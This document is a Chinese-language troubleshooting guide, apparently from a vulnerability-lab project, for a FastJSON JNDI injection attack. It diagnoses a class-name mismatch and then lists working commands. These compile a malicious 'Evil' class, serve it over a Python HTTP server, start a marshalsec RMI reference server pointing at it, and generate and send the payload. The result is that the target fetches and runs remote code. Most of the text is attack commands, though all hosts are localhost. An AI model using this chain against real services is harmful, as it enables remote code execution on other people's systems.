# JNDI 类加载问题修复指南

## 错误信息

```
Caused by: java.lang.NoClassDefFoundError: Evil (wrong name: com/govuln/fastjsonattack/Evil)
```

## 问题分析

这个错误说明：
1. ✅ **JNDI lookup 成功**：RMI 服务器连接正常，已经执行了 lookup
2. ✅ **类文件下载成功**：从 HTTP 服务器下载了类文件
3. ❌ **类名不匹配**：类加载器期望类名是 `Evil`，但实际类文件中的类名是 `com.govuln.fastjsonattack.Evil`

## 根本原因

RMI 服务器 URL 中的类名配置不正确，或者 HTTP 服务器上的类文件路径不正确。

## 解决方案

### 方案一：确保 RMI 服务器 URL 使用完整类名（推荐）

启动 RMI 服务器时，URL 中的类名必须是**完整包路径**：

```bash
# ✅ 正确：使用完整类名
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8087/#com.govuln.fastjsonattack.Evil 1098

# ❌ 错误：只使用类名
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8087/#Evil 1098
```

### 方案二：确保 HTTP 服务器路径正确

HTTP 服务器必须在 `target/classes` 目录下启动，这样类文件的路径才是正确的：

```bash
# ✅ 正确：在 classes 目录下启动
cd fastjsonattack/target/classes
python -m http.server 8087

# 这样类文件路径是：
# http://127.0.0.1:8087/com/govuln/fastjsonattack/Evil.class

# ❌ 错误：在其他目录启动
cd fastjsonattack
python -m http.server 8087
# 这样路径不对
```

### 方案三：验证类文件路径

测试类文件是否可以正确访问：

```bash
# 测试完整路径
curl http://127.0.0.1:8087/com/govuln/fastjsonattack/Evil.class

# 应该返回二进制数据（200 状态码）
# 如果返回 404，说明路径不对
```

## 完整操作步骤

### 1. 编译恶意类

```bash
cd fastjsonattack
mvn clean compile
```

### 2. 验证类文件存在

```bash
# 检查类文件是否存在
dir target\classes\com\govuln\fastjsonattack\Evil.class
# 应该能看到 Evil.class 文件
```

### 3. 启动 HTTP 服务器（关键！）

```bash
# ⚠️ 必须在 classes 目录下启动
cd target\classes
python -m http.server 8087
```

### 4. 验证 HTTP 服务器路径

在浏览器或使用 curl 访问：
```
http://127.0.0.1:8087/com/govuln/fastjsonattack/Evil.class
```

应该能下载到类文件。如果返回 404，说明路径不对。

### 5. 启动 RMI 服务器（使用完整类名）

```bash
# ⚠️ 关键：URL 中的类名必须是完整包路径
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8087/#com.govuln.fastjsonattack.Evil 1098
```

注意：
- URL 中使用 `#` 分隔符
- 类名使用点号（`.`）分隔包路径：`com.govuln.fastjsonattack.Evil`
- 不是斜杠（`/`）：`com/govuln/fastjsonattack/Evil` ❌

### 6. 生成 Payload

```bash
cd fastjsonattack
java -cp "target/classes;..." com.govuln.fastjsonattack.Client0 rmi://127.0.0.1:1098/exp
```

### 7. 发送 Payload

将生成的 JSON 发送到 FastJSON 服务。





